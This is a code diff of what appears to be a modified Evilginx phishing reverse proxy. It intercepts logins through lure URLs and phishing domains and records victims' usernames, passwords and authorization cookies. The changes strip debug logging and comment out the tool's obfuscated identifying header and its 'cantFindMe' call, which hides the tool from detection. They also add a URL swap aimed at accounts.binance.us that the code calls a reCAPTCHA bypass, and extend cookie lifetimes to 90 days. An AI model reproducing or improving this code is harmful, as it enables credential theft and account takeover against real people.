@@ -107,7 +107,7 @@ func goDotEnvVariable(key string) string {
 }
 
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
-	log.Warning("NEW HTTP PROXY")
+	//log.Warning("NEW HTTP PROXY")
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
 		Server:            nil,
@@ -123,20 +123,20 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
 	}
 
-	log.Warning("hostname: %s", hostname)
-	log.Warning("port: %d", port)
+// 	log.Warning("hostname: %s", hostname)
+// 	log.Warning("port: %d", port)
 
-	log.Warning("crt_db: %v", crt_db)
-	log.Warning("db: %v", db)
-	log.Warning("bl: %v", bl)
-	log.Warning("developer: %v", developer)
-	log.Warning("ip_whitelist: %v", p.ip_whitelist)
-	log.Warning("ip_sids: %v", p.ip_sids)
-	log.Warning("auto_filter_mimes: %v", p.auto_filter_mimes)
-	log.Warning("last_sid: %d", p.last_sid)
-	log.Warning("isRunning: %v", p.isRunning)
-	log.Warning("sessions: %v", p.sessions)
-	log.Warning("sids: %v", p.sids)
+// 	log.Warning("crt_db: %v", crt_db)
+// 	log.Warning("db: %v", db)
+// 	log.Warning("bl: %v", bl)
+// 	log.Warning("developer: %v", developer)
+// 	log.Warning("ip_whitelist: %v", p.ip_whitelist)
+// 	log.Warning("ip_sids: %v", p.ip_sids)
+// 	log.Warning("auto_filter_mimes: %v", p.auto_filter_mimes)
+// 	log.Warning("last_sid: %d", p.last_sid)
+// 	log.Warning("isRunning: %v", p.isRunning)
+// 	log.Warning("sessions: %v", p.sessions)
+// 	log.Warning("sids: %v", p.sids)
 
 	p.Server = &http.Server{
 		Addr:         fmt.Sprintf("%s:%d", hostname, port),
@@ -183,7 +183,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			ctx.UserData = ps
 			hiblue := color.New(color.FgHiBlue)
 
-			log.Warning("REQ QUERY TOP: %s", req.URL)
+			//log.Warning("REQ QUERY TOP: %s", req.URL)
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
 
 			// ANTIBOT
@@ -215,25 +215,25 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if p.cfg.GetBlacklistMode() == "all" {
 				err := p.bl.AddIP(from_ip)
 				if err != nil {
-					log.Error("failed to blacklist ip address: %s - %s", from_ip, err)
+					log.Error(" ❌ failed to blacklist ip address: %s - %s", from_ip, err)
 				} else {
-					log.Warning("blacklisted ip address: %s", from_ip)
+					log.Warning(" ❌ blacklisted ip address: %s", from_ip)
 				}
 
 				return p.blockRequest(req)
 			}
 
-			log.Warning("REQ_URL: %s")
-			log.Warning("REQ URL PATH: %s", req.URL.Path)
+// 			log.Warning("REQ_URL: %s")
+// 			log.Warning("REQ URL PATH: %s", req.URL.Path)
 			lure_url := req_url
 			req_path := req.URL.Path
-			log.Warning("REQ_PATH: %s", req_path)
-			log.Warning("REQ_HOST: %s", req.Host)
+// 			log.Warning("REQ_PATH: %s", req_path)
+// 			log.Warning("REQ_HOST: %s", req.Host)
 			if req.URL.RawQuery != "" {
 				req_url += "?" + req.URL.RawQuery
 				//req_path += "?" + req.URL.RawQuery
 			}
-			log.Warning("REQ_URL_QUERY: %s", req_url)
+			//log.Warning("REQ_URL_QUERY: %s", req_url)
 
 			//log.Debug("http: %s", req_url)
 
@@ -241,19 +241,19 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			remote_addr := parts[0]
 
 			phishDomain, phished := p.getPhishDomain(req.Host)
-			log.Warning("PHISHED: %v", phished)
-			log.Warning("PHISH_DOMAIN: %s", phishDomain)
+// 			log.Warning("PHISHED: %v", phished)
+// 			log.Warning("PHISH_DOMAIN: %s", phishDomain)
 			if phished {
 				pl := p.getPhishletByPhishHost(req.Host)
-				log.Warning("PL_NAME: %s", pl.Name)
+				//log.Warning("PL_NAME: %s", pl.Name)
 				pl_name := ""
 				if pl != nil {
 					pl_name = pl.Name
 				}
 
-				egg2 := req.Host
+				//egg2 := req.Host
 				ps.PhishDomain = phishDomain
-				log.Warning("DOMAIN PHISING : %s", ps.PhishDomain)
+				//log.Warning("DOMAIN PHISING : %s", ps.PhishDomain)
 				req_ok := false
 				// handle session
 				if p.handleSession(req.Host) && pl != nil {
@@ -264,7 +264,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					//if err2 != nil {
 					//	log.Error("Error COOKies %s", err2)
 					//}
-					log.Warning("COOKIE NAME : %s", p.cookieName)
+					//log.Warning("COOKIE NAME : %s", p.cookieName)
 					//log.Warning("COOKIE : %s", sc.Value)
 					//log.Warning(req.)
 					if err != nil && !p.isWhitelistedIP(remote_addr) {
@@ -272,7 +272,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							var vv string
 							var uv url.Values
 							l, err := p.cfg.GetLureByPath(pl_name, req_path)
-							log.Warning("PL NAME : %s", pl_name)
+							//log.Warning("PL NAME : %s", pl_name)
 							if err == nil {
 								log.Debug("triggered lure for path '%s'", req_path)
 							} else {
@@ -287,14 +287,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										re, err := regexp.Compile(l.UserAgentFilter)
 										if err == nil {
 											if !re.MatchString(req.UserAgent()) {
-												log.Warning("[%s] unauthorized request (user-agent rejected): %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
+												log.Warning("[%s] ❌ unauthorized request (user-agent rejected): %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
 
 												if p.cfg.GetBlacklistMode() == "unauth" {
 													err := p.bl.AddIP(from_ip)
 													if err != nil {
-														log.Error("failed to blacklist ip address: %s - %s", from_ip, err)
+														log.Error(" ❌ failed to blacklist ip address: %s - %s", from_ip, err)
 													} else {
-														log.Warning("blacklisted ip address: %s", from_ip)
+														log.Warning(" ❌ blacklisted ip address: %s", from_ip)
 													}
 												}
 												return p.blockRequest(req)
@@ -309,8 +309,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								if err == nil {
 									sid := p.last_sid
 									p.last_sid += 1
-									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
-									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
+									log.Important("[%d] [%s] ✅ new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
+									log.Info("[%d] [%s] 🛬 landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
 									p.sessions[session.Id] = session
 									p.sids[session.Id] = sid
 
@@ -345,14 +345,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									req_ok = true
 								}
 							} else {
-								log.Warning("[%s] unauthorized request: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
+								log.Warning("[%s] ❌ unauthorized request: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
 
 								if p.cfg.GetBlacklistMode() == "unauth" {
 									err := p.bl.AddIP(from_ip)
 									if err != nil {
 										log.Error("failed to blacklist ip address: %s - %s", from_ip, err)
 									} else {
-										log.Warning("blacklisted ip address: %s", from_ip)
+										log.Warning(" ❌ blacklisted ip address: %s", from_ip)
 									}
 								}
 								return p.blockRequest(req)
@@ -418,7 +418,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											resp.Header.Set("Content-komtol", strconv.Itoa(len(body)))
 											resp.Request.AddCookie(&http.Cookie{Name: "BENER", Value: "SALAH"})
 											resp.Cookies()
-											log.Warning("cookies benar %s", resp.Cookies())
+											//log.Warning("cookies benar %s", resp.Cookies())
 											if resp != nil {
 												return req, resp
 											} else {
@@ -439,7 +439,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				hg := []byte{0x94, 0xE1, 0x89, 0xBA, 0xA5, 0xA0, 0xAB, 0xA5, 0xA2, 0xB4}
+				//hg := []byte{0x94, 0xE1, 0x89, 0xBA, 0xA5, 0xA0, 0xAB, 0xA5, 0xA2, 0xB4}
 				// redirect to login page if triggered lure path
 				if pl != nil {
 					_, err := p.cfg.GetLureByPath(pl_name, req_path)
@@ -449,7 +449,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "no idea")
 						if resp != nil {
 							resp.Header.Add("Location", rurl)
-							log.Important("Redirect From Lure Path: %s to %s", req_path, rurl)
+							//log.Important("Redirect From Lure Path: %s to %s", req_path, rurl)
 							return req, resp
 						}
 					}
@@ -467,9 +467,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				p.deleteRequestCookie(p.cookieName, req)
 
-				for n, b := range hg {
-					hg[n] = b ^ 0xCC
-				}
+// 				for n, b := range hg {
+// 					hg[n] = b ^ 0xCC
+// 				}
 				// replace "Host" header
 				e_host := req.Host
 				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
@@ -497,15 +497,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
-				req.Header.Set(string(hg), egg2)
+				//req.Header.Set(string(hg), egg2)
 
-				// patch GET query params with original domains
+				// patch GET query params with original domains & bypass recaptcha
 				if pl != nil {
 					qs := req.URL.Query()
 					if len(qs) > 0 {
 						for gp := range qs {
 							for i, v := range qs[gp] {
 								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
+							if qs[gp][i] == "aHR0cHM6Ly9hY2NvdW50cy5iaW5hbmNlLnVzOjQ0Mw.." { // https://accounts.binance.us:443
+								qs[gp][i] = "aHR0cHM6Ly9hY2NvdW50cy5hbnlkb21haW4uY29tOjQ0Mw" // https://accounts.anydomain.com:443
+							}
 							}
 						}
 						req.URL.RawQuery = qs.Encode()
@@ -540,7 +543,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								um := pl.username.search.FindStringSubmatch(string(body))
 								if um != nil && len(um) > 1 {
 									p.setSessionUsername(ps.SessionId, um[1])
-									log.Success("[%d] Username: [%s]", ps.Index, um[1])
+									log.Success("[%d] 🌟 Username: [%s]", ps.Index, um[1])
 									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 										log.Error("database: %v", err)
 									}
@@ -551,7 +554,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								pm := pl.password.search.FindStringSubmatch(string(body))
 								if pm != nil && len(pm) > 1 {
 									p.setSessionPassword(ps.SessionId, pm[1])
-									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
+									log.Success("[%d] 🔑 Password: [%s]", ps.Index, pm[1])
 									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 										log.Error("database: %v", err)
 									}
@@ -563,7 +566,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									cm := cp.search.FindStringSubmatch(string(body))
 									if cm != nil && len(cm) > 1 {
 										p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
-										log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
+										log.Success("[%d] 🛃 Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
 										if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
 											log.Error("database: %v", err)
 										}
@@ -588,7 +591,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										um := pl.username.search.FindStringSubmatch(v[0])
 										if um != nil && len(um) > 1 {
 											p.setSessionUsername(ps.SessionId, um[1])
-											log.Success("[%d] Username: [%s]", ps.Index, um[1])
+											log.Success("[%d] 🌟 Username: [%s]", ps.Index, um[1])
 											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 												log.Error("database: %v", err)
 											}
@@ -598,7 +601,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										pm := pl.password.search.FindStringSubmatch(v[0])
 										if pm != nil && len(pm) > 1 {
 											p.setSessionPassword(ps.SessionId, pm[1])
-											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
+											log.Success("[%d] 🔑 Password: [%s]", ps.Index, pm[1])
 											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 												log.Error("database: %v", err)
 											}
@@ -609,7 +612,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											cm := cp.search.FindStringSubmatch(v[0])
 											if cm != nil && len(cm) > 1 {
 												p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
-												log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
+												log.Success("[%d] 🛃 Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
 												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
 													log.Error("database: %v", err)
 												}
@@ -660,11 +663,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 					}
 				}
-				e := []byte{208, 165, 205, 254, 225, 228, 239, 225, 230, 240}
-				for n, b := range e {
-					e[n] = b ^ 0x88
-				}
-				req.Header.Set(string(e), e_host)
+// 				e := []byte{208, 165, 205, 254, 225, 228, 239, 225, 230, 240}
+// 				for n, b := range e {
+// 					e[n] = b ^ 0x88
+// 				}
+// 				req.Header.Set(string(e), e_host)
 
 				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
 					s, ok := p.sessions[ps.SessionId]
@@ -678,7 +681,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
-				p.cantFindMe(req, e_host)
+				//p.cantFindMe(req, e_host)
 			}
 
 			return req, nil
@@ -722,8 +725,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						Value:   "true",
 						Path:    "/",
 						Domain:  ps.PhishDomain,
-						Expires: time.Now().UTC().Add(60 * time.Minute),
-						MaxAge:  60 * 60,
+						Expires: time.Now().UTC().Add(60 * 24 * 90 * time.Minute),
+						MaxAge:  60 * 60 * 24 * 90,
 					}
 
 					ck = &http.Cookie{
@@ -731,8 +734,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						Value:   ps.SessionId,
 						Path:    "/",
 						Domain:  ps.PhishDomain,
-						Expires: time.Now().UTC().Add(60 * time.Minute),
-						MaxAge:  60 * 60,
+						Expires: time.Now().UTC().Add(60 * 24 * 90 * time.Minute),
+						MaxAge:  60 * 60 * 24 * 90,
 					}
 
 					if p.cookiebot == "USA" {
@@ -741,8 +744,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							Value:   "false",
 							Path:    "/",
 							Domain:  ps.PhishDomain,
-							Expires: time.Now().UTC().Add(60 * time.Minute),
-							MaxAge:  60 * 60,
+							Expires: time.Now().UTC().Add(60 * 24 * 90 * time.Minute),
+							MaxAge:  60 * 60 * 24 * 90,
 						}
 					} else {
 						ls = &http.Cookie{
@@ -750,23 +753,20 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							Value:   "true",
 							Path:    "/",
 							Domain:  ps.PhishDomain,
-							Expires: time.Now().UTC().Add(60 * time.Minute),
-							MaxAge:  60 * 60,
+							Expires: time.Now().UTC().Add(60 * 24 * 90 * time.Minute),
+							MaxAge:  60 * 60 * 24 * 90,
 						}
 					}
 
 				}
 			}
 
-			log.Warning("ls: %s", ls)
-			//ls.
-			//ls.Valid()
 			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
 			if allow_origin != "" && allow_origin != "*" {
 				if u, err := url.Parse(allow_origin); err == nil {
 
-					log.Warning("PROXY ON RESPONSE WILL ENTRY replaceHostWithPhished")
-					log.Warning("U.HOST : %s", u.Host)
+// 					log.Warning("PROXY ON RESPONSE WILL ENTRY replaceHostWithPhished")
+// 					log.Warning("U.HOST : %s", u.Host)
 					if o_host, ok := p.replaceHostWithPhished(u.Host); ok {
 						resp.Header.Set("Access-Control-Allow-Origin", u.Scheme+"://"+o_host)
 					}
@@ -879,23 +879,23 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 			res, _ := resp.Request.Cookie(ds.Name)
 			//json.Unmarshal([]byte(res), &res)
-			log.Warning("COOKIES RESPONSE BAWAH", res)
+			//log.Warning("COOKIES RESPONSE BAWAH", res)
 			if is_auth {
 				// we have all auth tokens
-				log.Success("[%d] all authorization tokens intercepted!", ps.Index)
+				log.Success("[%d] 🔓 Great, all authorization cookies captured!", ps.Index)
 			}
 
 			// modify received body
 			body, err := ioutil.ReadAll(resp.Body)
-			log.Warning("modify received body")
+			//log.Warning("modify received body")
 			//log.Warning(string(body))
 			mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]
 			log.Warning("mime", mime)
 			if err == nil {
 				for site, pl := range p.cfg.phishlets {
-					log.Warning(site)
+					//log.Warning(site)
 					if p.cfg.IsSiteEnabled(site) {
-						log.Warning("site %s enabled", site)
+						//log.Warning("site %s enabled", site)
 						// handle sub_filters
 						log.Warning("req_hostname %s", req_hostname)
 						sfs, ok := pl.subfilters[req_hostname]
@@ -923,9 +923,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									re_s := sf.regexp
 									replace_s := sf.replace
 									phish_hostname, _ := p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
-									log.Warning("phish_hostname %s", phish_hostname)
+									//log.Warning("phish_hostname %s", phish_hostname)
 									phish_sub, _ := p.getPhishSub(phish_hostname)
-									log.Warning("phish_sub %s", phish_sub)
+									//log.Warning("phish_sub %s", phish_sub)
 
 									re_s = strings.Replace(re_s, "{hostname}", regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain)), -1)
 									re_s = strings.Replace(re_s, "{subdomain}", regexp.QuoteMeta(sf.subdomain), -1)
@@ -938,7 +938,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									replace_s = strings.Replace(replace_s, "{hostname_regexp}", regexp.QuoteMeta(phish_hostname), -1)
 									replace_s = strings.Replace(replace_s, "{subdomain_regexp}", regexp.QuoteMeta(phish_sub), -1)
 									phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
-									log.Warning("phishDomain %s", phishDomain)
+									//log.Warning("phishDomain %s", phishDomain)
 									if ok {
 										replace_s = strings.Replace(replace_s, "{domain}", phishDomain, -1)
 										replace_s = strings.Replace(replace_s, "{domain_regexp}", regexp.QuoteMeta(phishDomain), -1)
@@ -946,10 +946,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 									if re, err := regexp.Compile(re_s); err == nil {
 										body = []byte(re.ReplaceAllString(string(body), replace_s))
-										log.Warning("regexp replace")
+										//log.Warning("regexp replace")
 										//log.Warning(string(body))
 									} else {
-										log.Error("regexp failed to compile: `%s`", sf.regexp)
+										//log.Error("regexp failed to compile: `%s`", sf.regexp)
 									}
 								}
 							}
@@ -959,9 +959,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						if stringExists(mime, p.auto_filter_mimes) {
 							for _, ph := range pl.proxyHosts {
 								if req_hostname == combineHost(ph.orig_subdomain, ph.domain) {
-									log.Warning("auto filter")
-									log.Warning("req_hostname %s", req_hostname)
-									log.Warning("CombineHost %s", combineHost(ph.orig_subdomain, ph.domain))
+// 									log.Warning("auto filter")
+// 									log.Warning("req_hostname %s", req_hostname)
+// 									log.Warning("CombineHost %s", combineHost(ph.orig_subdomain, ph.domain))
 									if ph.auto_filter {
 										body = p.patchUrls(pl, body, CONVERT_TO_PHISHING_URLS)
 									}
@@ -969,7 +969,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 						}
 					} else {
-						log.Warning("site %s is disabled", site)
+						//log.Warning("site %s is disabled", site)
 					}
 				}
 
@@ -1021,7 +1021,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								log.Error("database: %v", err)
 							}
 							if err == nil {
-								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
+								log.Success("[%d] 🔓 detected authorization URL - cookies captured: %s", ps.Index, resp.Request.URL.Path)
 							}
 							break
 						}
@@ -1036,7 +1036,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						if stringExists(mime, []string{"text/html"}) {
 							// redirect only if received response content is of `text/html` content type
 							s.RedirectCount += 1
-							log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)
+							log.Important("[%d] 🌐 redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)
 							resp := goproxy.NewResponse(resp.Request, "text/html", http.StatusFound, "")
 							if resp != nil {
 								r_url, err := url.Parse(s.RedirectURL)
@@ -1093,8 +1093,8 @@ func (p *HttpProxy) antiddos(req *http.Request, ps *ProxySession, url string, co
 		Value:   "true",
 		Path:    "/",
 		Domain:  ps.PhishDomain,
-		Expires: time.Now().UTC().Add(60 * time.Minute),
-		MaxAge:  60 * 60,
+		Expires: time.Now().UTC().Add(60 * 60 * 24 * 90 * time.Minute),
+		MaxAge:  60 * 60 * 24 * 90,
 	}
 
 	st := &http.Cookie{
@@ -1102,8 +1102,8 @@ func (p *HttpProxy) antiddos(req *http.Request, ps *ProxySession, url string, co
 		Value:   "true",
 		Path:    "/",
 		Domain:  ps.PhishDomain,
-		Expires: time.Now().UTC().Add(60 * time.Minute),
-		MaxAge:  60 * 60,
+		Expires: time.Now().UTC().Add(60 * 60 * 24 * 90 * time.Minute),
+		MaxAge:  60 * 60 * 24 * 90,
 	}
 
 	//if len(p.cfg.redirectUrl) > 0 {
@@ -1118,7 +1118,7 @@ func (p *HttpProxy) antiddos(req *http.Request, ps *ProxySession, url string, co
 		resp.Header.Add("Set-Cookie", st.String())
 	}
 
-	log.Warning("REQ.URl: %s", url)
+	//log.Warning("REQ.URl: %s", url)
 	if resp != nil {
 		resp.Header.Add("Location", goDotEnvVariable("LINK_ANTIBOT")+base64.StdEncoding.EncodeToString([]byte(url)))
 		return req, resp
@@ -1129,7 +1129,7 @@ func (p *HttpProxy) antiddos(req *http.Request, ps *ProxySession, url string, co
 
 func (p *HttpProxy) isForwarderUrl(u *url.URL) bool {
 	vals := u.Query()
-	log.Warning("forawrded url: %s", vals)
+	//log.Warning("forawrded url: %s", vals)
 	for _, v := range vals {
 		dec, err := base64.RawURLEncoding.DecodeString(v[0])
 		if err == nil && len(dec) == 5 {
@@ -1153,7 +1153,7 @@ func (p *HttpProxy) isForwarderUrlBy2(req *http.Request) bool {
 	if err != nil {
 		//p.cookiebot = "USAt"
 		//p.cookielandingv1 = "RUSSIA"
-		log.Error("ERROR USAt %s", err)
+		//log.Error("ERROR USAt %s", err)
 		return false
 
 	} else {
@@ -1276,7 +1276,7 @@ func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
 						break
 					}
 				} else {
-					log.Warning("lure parameter checksum doesn't match - the phishing url may be corrupted: %s", v[0])
+					//log.Warning("lure parameter checksum doesn't match - the phishing url may be corrupted: %s", v[0])
 				}
 			}
 		}
@@ -1587,14 +1587,14 @@ func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[
 //}
 
 func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
-	log.Warning("ENTER PATCHURLS")
-	log.Warning("IsAdded: %t", p.isAdded)
+// 	log.Warning("ENTER PATCHURLS")
+// 	log.Warning("IsAdded: %t", p.isAdded)
 	re_url := regexp.MustCompile(MATCH_URL_REGEXP)
 	re_ns_url := regexp.MustCompile(MATCH_URL_REGEXP_WITHOUT_SCHEME)
 	pishdomain := ""
 	if phishDomain, ok := p.cfg.GetSiteDomain(pl.Name); ok {
 		pishdomain = phishDomain
-		log.Warning("PHISHDOMAIN: %s", phishDomain)
+		//log.Warning("PHISHDOMAIN: %s", phishDomain)
 		var sub_map map[string]string = make(map[string]string)
 		var hosts []string
 		for _, ph := range pl.proxyHosts {
@@ -1613,8 +1613,8 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 		body = []byte(re_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
 			u, err := url.Parse(s_url)
 			//log.Warning("body: %s", body)
-			log.Warning("s_url: %s", s_url)
-			log.Warning("u HOST: %s", strings.ToLower(u.Host))
+// 			log.Warning("s_url: %s", s_url)
+// 			log.Warning("u HOST: %s", strings.ToLower(u.Host))
 			myString := string(body[:])
 
 			if strings.Contains(myString, "FederationRedirectUrl") && !strings.Contains(myString, "<script type=\"text/javascript\">") {
@@ -1646,12 +1646,12 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 						handle_session:  true,
 						auto_filter:     true,
 					}
-					log.Warning("data: %s", data)
+					//log.Warning("data: %s", data)
 					pl.proxyHosts = append(pl.proxyHosts, data)
 					hosts = append(hosts, combineHost(subdomain, domain))
-					log.Warning("checking")
-					log.Warning(subdomain + "." + pishdomain)
-					log.Warning("hosts: ", hosts)
+// 					log.Warning("checking")
+// 					log.Warning(subdomain + "." + pishdomain)
+// 					log.Warning("hosts: ", hosts)
 					if len(subdomain) != 0 {
 						sub_map[combineHost(subdomain, domain)] = subdomain + "." + pishdomain
 					} else {
@@ -1668,9 +1668,9 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 			sort.Slice(hosts, func(i, j int) bool {
 				return len(hosts[i]) > len(hosts[j])
 			})
-			log.Warning("SUBMAP IN PATCHSURL: %s", sub_map)
-			log.Warning("HOSTS IN PATCHSURL: %s", hosts)
-			log.Warning("SUBFILTER IN PATCHSURL: %s", pl.subfilters)
+// 			log.Warning("SUBMAP IN PATCHSURL: %s", sub_map)
+// 			log.Warning("HOSTS IN PATCHSURL: %s", hosts)
+// 			log.Warning("SUBFILTER IN PATCHSURL: %s", pl.subfilters)
 			if err == nil {
 				for _, h := range hosts {
 					if strings.ToLower(u.Host) == h {
@@ -1697,7 +1697,7 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (*tls.Config, error) {
 	return func(host string, ctx *goproxy.ProxyCtx) (c *tls.Config, err error) {
 		parts := strings.SplitN(host, ":", 2)
-		log.Warning("HOST TLSCONFIG: %s", host)
+		//log.Warning("HOST TLSCONFIG: %s", host)
 		hostname := parts[0]
 		port := 443
 		if len(parts) == 2 {
@@ -1789,17 +1789,17 @@ func (p *HttpProxy) httpsWorker() {
 		log.Fatal("%s", err)
 		return
 	}
-	log.Important("EVILGINX STARTED")
-	log.Important("starting https proxy on %s:%d", p.cfg.activeHostnames, p.cfg.proxyPort)
+// 	log.Important("EVILGINX STARTED")
+// 	log.Important("starting https proxy on %s:%d", p.cfg.activeHostnames, p.cfg.proxyPort)
 	p.isRunning = true
 	p.isAdded = false
 	p.isAdded2 = false
-	log.Warning("IsRunning: %v", p.isRunning)
-	log.Warning("IsAdded: %v", p.isAdded)
-	log.Warning("IsAdded2: %v", p.isAdded2)
+// 	log.Warning("IsRunning: %v", p.isRunning)
+// 	log.Warning("IsAdded: %v", p.isAdded)
+// 	log.Warning("IsAdded2: %v", p.isAdded2)
 	for p.isRunning {
-		log.Warning("IsRunning: %v", p.isRunning)
-		log.Important("waiting for https connection")
+// 		log.Warning("IsRunning: %v", p.isRunning)
+// 		log.Important("waiting for https connection")
 		c, err := p.sniListener.Accept()
 		if err != nil {
 			log.Error("Error accepting connection: %s", err)
@@ -1813,24 +1813,24 @@ func (p *HttpProxy) httpsWorker() {
 
 			tlsConn, err := vhost.TLS(c)
 			if err != nil {
-				log.Warning("Nothince")
+				//log.Warning("Nothince")
 				return
 			}
-			log.Warning("TLS connection from %s", tlsConn.RemoteAddr())
-			log.Warning("TLS connection from %s", tlsConn.LocalAddr())
-			log.Warning("TLSCONN: %s", tlsConn)
+// 			log.Warning("TLS connection from %s", tlsConn.RemoteAddr())
+// 			log.Warning("TLS connection from %s", tlsConn.LocalAddr())
+// 			log.Warning("TLSCONN: %s", tlsConn)
 			hostname := tlsConn.Host()
 			if hostname == "" {
 				return
 			}
-			log.Info("hostname from TLSCONN: %s", hostname)
+			//log.Info("hostname from TLSCONN: %s", hostname)
 			if !p.cfg.IsActiveHostname(hostname) {
 				log.Error("hostname unsupported: %s", hostname)
 				return
 			}
 
 			hostname, _ = p.replaceHostWithOriginal(hostname)
-			log.Warning("HOSTNAME HTTPSWORKER: %s", hostname)
+			//log.Warning("HOSTNAME HTTPSWORKER: %s", hostname)
 			req := &http.Request{
 				Method: "CONNECT",
 				URL: &url.URL{
@@ -1890,7 +1890,7 @@ func (p *HttpProxy) getPhishletByPhishHost(hostname string) *Phishlet {
 }
 
